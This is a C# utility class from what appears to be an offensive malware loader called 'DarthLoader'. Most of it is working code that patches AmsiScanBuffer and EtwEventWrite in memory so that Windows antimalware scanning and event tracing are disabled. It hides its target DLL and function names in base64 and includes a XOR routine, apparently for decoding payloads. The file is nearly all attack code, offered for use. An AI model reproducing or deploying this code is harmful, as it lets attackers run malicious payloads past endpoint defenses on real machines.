using System;
using System.Runtime.InteropServices;
using System.Text;


namespace DarthLoader
{
    class Utilities
    {
        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32")]
        static extern IntPtr LoadLibrary(string name);

        [DllImport("kernel32")]
        static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        static bool Is64Bit
        {
            get
            {
                return IntPtr.Size == 8;
            }
        }

        static byte[] patch(string function)
        {
            byte[] patch;
            if (function.ToLower() == Base64Decode("YnlwYXNzZXR3"))
            {
                if (Is64Bit)
                {
                    patch = new byte[2];
                    patch[0] = 0xc3;
                    patch[1] = 0x00;
                }
                else
                {
                    patch = new byte[3];
                    patch[0] = 0xc2;
                    patch[1] = 0x14;
                    patch[2] = 0x00;
                }
                return patch;
            }
            else if (function.ToLower() == Base64Decode("YnlwYXNzYW1zaQ=="))
            {
                if (Is64Bit)
                {
                    patch = new byte[6];
                    patch[0] = 0xB8;
                    patch[1] = 0x57;
                    patch[2] = 0x00;
                    patch[3] = 0x07;
                    patch[4] = 0x80;
                    patch[5] = 0xC3;
                }
                else
                {
                    patch = new byte[8];
                    patch[0] = 0xB8;
                    patch[1] = 0x57;
                    patch[2] = 0x00;
                    patch[3] = 0x07;
                    patch[4] = 0x80;
                    patch[5] = 0xC2;
                    patch[6] = 0x18;
                    patch[7] = 0x00;

                }
                return patch;
            }
            else throw new ArgumentException("[!] Function is not supported...");
        }

        public static string Base64Decode(string base64EncodedData)
        {
            var base64EncodedBytes = System.Convert.FromBase64String(base64EncodedData);
            return System.Text.Encoding.UTF8.GetString(base64EncodedBytes);
        }

        public static void BypassETW()
        {
            string traceloc = Base64Decode("bnRkbGwuZGxs");
            string magicFunction = Base64Decode("RXR3RXZlbnRXcml0ZQ==");
            IntPtr ntdllAddr = LoadLibrary(traceloc);
            IntPtr traceAddr = GetProcAddress(ntdllAddr, magicFunction);
            byte[] magicVoodoo = patch(Base64Decode("QnlwYXNzRVRX"));
            VirtualProtect(traceAddr, (UIntPtr)magicVoodoo.Length, 0x40, out uint oldProtect);
            Marshal.Copy(magicVoodoo, 0, traceAddr, magicVoodoo.Length);
            VirtualProtect(traceAddr, (UIntPtr)magicVoodoo.Length, oldProtect, out uint newOldProtect);
            Console.WriteLine("[+] ETW bypassed!");
        }
        public static void BypassAMSI()
        {
            string avloc = Base64Decode("YW1zaS5kbGw=");
            string magicFunction = Base64Decode("QW1zaVNjYW5CdWZmZXI=");
            IntPtr avAddr = LoadLibrary(avloc);
            IntPtr traceAddr = GetProcAddress(avAddr, magicFunction);
            byte[] magicVoodoo = patch(Base64Decode("QnlwYXNzQU1TSQ=="));
            VirtualProtect(traceAddr, (UIntPtr)magicVoodoo.Length, 0x40, out uint oldProtect);
            Marshal.Copy(magicVoodoo, 0, traceAddr, magicVoodoo.Length);
            VirtualProtect(traceAddr, (UIntPtr)magicVoodoo.Length, oldProtect, out uint newOldProtect);
            Console.WriteLine("[+] AMSI bypassed!");
        }

        public static byte[] Xor(byte[] inputByteArray, string keyString)
        {
            byte[] key = Encoding.UTF8.GetBytes(keyString);
            byte[] data = new byte[inputByteArray.Length];

            for (int i = 0; i < inputByteArray.Length; i++)
            {
                data[i] = (byte)(inputByteArray[i] ^ key[i % key.Length]);
            }
            return data;
        } 
    }
}

